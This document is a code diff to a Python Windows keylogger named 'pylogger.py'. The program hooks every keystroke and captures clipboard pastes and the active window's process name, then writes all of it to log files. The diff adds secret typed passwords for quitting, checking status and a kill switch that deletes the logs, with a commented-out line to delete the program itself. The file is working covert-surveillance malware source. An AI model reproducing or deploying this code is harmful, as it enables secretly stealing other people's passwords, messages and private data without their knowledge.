@@ -20,17 +20,57 @@ filesize_limit = 500000 #Bytes
 paste_limit = 500 #chars
 
 #CheckQuit Vars
-quit_pass = "zwagquit"
+quit_pass = "pyquit"
 quit_pass_counter = 0
 
-
 #CheckKill Vars
-kill_pass = "zwagkill"
+kill_pass = "pykill"
 kill_pass_counter = 0
+kill_program_name = "pylogger.py"
 
+#Pause Vars
+status_pass = "pystatus"
+status_pass_counter = 0
 
+#Todo:
+#1. DumpSwitch
+#2. Encryption
+#3. Argument start
 
+#This is triggered every time a key is pressed
+#So you can think of this as the main entry point for all other functions
+def KeyStroke(event):
 
+    global current_window   
+
+    # check to see if target changed windows
+    if event.WindowName != current_window:
+        current_window = event.WindowName        
+        get_current_process()
+
+    # if they pressed a standard key
+    if event.Ascii > 32 and event.Ascii < 127:
+        print chr(event.Ascii),
+        checkTriggers(chr(event.Ascii))
+        writeToFile(chr(event.Ascii))
+    else:
+        # if [Ctrl-V], get the value on the clipboard
+        # added by Dan Frisch 2014
+        if event.Key == "V":
+            win32clipboard.OpenClipboard()
+            pasted_value = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+            if (len(pasted_value) < paste_limit):
+                print "[PASTE] - %s" % (pasted_value),
+                writeToFile("[PASTE] - %s" % (pasted_value))
+        else:
+            print "[%s]" % event.Key,
+            writeToFile("[%s]" % event.Key)
+
+    # pass execution to next hook registered 
+    return True
+
+#This gets the current process, so that we can display it on the log
 def get_current_process():
 
     # get a handle to the foreground window
@@ -67,43 +107,15 @@ def get_current_process():
     kernel32.CloseHandle(hwnd)
     kernel32.CloseHandle(h_process)
     
-def KeyStroke(event):
-
-    global current_window   
-
-    # check to see if target changed windows
-    if event.WindowName != current_window:
-        current_window = event.WindowName        
-        get_current_process()
-
-    # if they pressed a standard key
-    if event.Ascii > 32 and event.Ascii < 127:
-        print chr(event.Ascii),
-        checkTriggers(chr(event.Ascii))
-        writeToFile(chr(event.Ascii))
-    else:
-        # if [Ctrl-V], get the value on the clipboard
-        # added by Dan Frisch 2014
-        if event.Key == "V":
-            win32clipboard.OpenClipboard()
-            pasted_value = win32clipboard.GetClipboardData()
-            win32clipboard.CloseClipboard()
-            if (len(pasted_value) < paste_limit):
-                print "[PASTE] - %s" % (pasted_value),
-                writeToFile("[PASTE] - %s" % (pasted_value))
-        else:
-            print "[%s]" % event.Key,
-            writeToFile("[%s]" % event.Key)
-
-    # pass execution to next hook registered 
-    return True
-
+#This checks all the triggers we have to pause, kill, dump, etc.
 def checkTriggers(key):
     quitSwitch(key)
     killSwitch(key)
     pauseSwitch(key)
     resumeSwitch(key)
+    statusSwitch(key)
 
+#Quit Switch - Turns the keylogger off
 def quitSwitch(key):
     global quit_pass_counter
 
@@ -112,8 +124,9 @@ def quitSwitch(key):
         if (quit_pass_counter >= len(quit_pass)):
             quit()
     else:
-        pass_counter = 0;
+        quit_pass_counter = 0;
 
+#Kill Switch - Deletes everything including the keylogger itself
 def killSwitch(key):
     global kill_pass_counter
 
@@ -123,26 +136,40 @@ def killSwitch(key):
 
             filelist = [ f for f in os.listdir(".") if f.endswith(".log") ]
             for f in filelist:
-                os.remove(f)
-            #os.remove("yourfile.py")
+                os.remove(f);
+            #os.remove(kill_program_name);
             quit()
     else:
-        pass_counter = 0;
+        kill_pass_counter = 0;
 
+#Pause Switch - Keylogger won't log until resumed
 def pauseSwitch(key):
     i = "TODO"
 
+#Resume Switch - Keylogger will start logging again
 def resumeSwitch(key):
     i = "TODO"
 
+#Status Switch - Will beep to let you know its alive
 def statusSwitch(key):
-    i = "TODO"
+    global status_pass_counter
 
+    print"\n\n",status_pass_counter,"\n\n"
+
+
+    if (status_pass[status_pass_counter] == key):
+        status_pass_counter = status_pass_counter + 1
+        if (status_pass_counter >= len(status_pass)):
+            print "\a";
+            status_pass_counter = 0;
+    else:
+        status_pass_counter = 0;
+
+#Dump everything to a given directory
 def dumpSwitch(key):
     i = "TODO"
 
-#ENCRYPTION
-
+#Write to File
 def writeToFile(key):
     global open_type
     filename = filename_base+filename_ext
@@ -152,13 +179,13 @@ def writeToFile(key):
             xdate = strftime("%Y-%m-%d--%H-%M-%S", gmtime())
             shutil.copy2(filename, filename_base+xdate+filename_ext)
             open_type = 'w+'
-            print "SET"
+            print "New File"
         else:
             open_type = 'a+'
     except:
         open_type = 'a+'
 
-    print "A",open_type
+    #print "A",open_type
     target = open(filename,open_type)
     target.write(key)
     target.close();
@@ -173,3 +200,4 @@ kl.KeyDown = KeyStroke
 # register the hook and execute forever
 kl.HookKeyboard()
 pythoncom.PumpMessages()
+
